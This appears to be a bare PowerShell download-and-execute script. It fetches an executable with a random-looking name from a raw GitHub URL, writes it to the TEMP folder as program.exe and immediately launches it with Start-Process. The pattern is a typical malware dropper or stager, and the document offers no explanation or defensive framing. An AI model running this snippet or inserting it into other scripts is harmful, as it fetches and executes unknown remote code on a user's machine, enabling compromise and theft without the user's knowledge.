$url = "https://raw.githubusercontent.com/fasa3e/sagsg/refs/heads/main/aigu4lkhzg0p6mxc.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output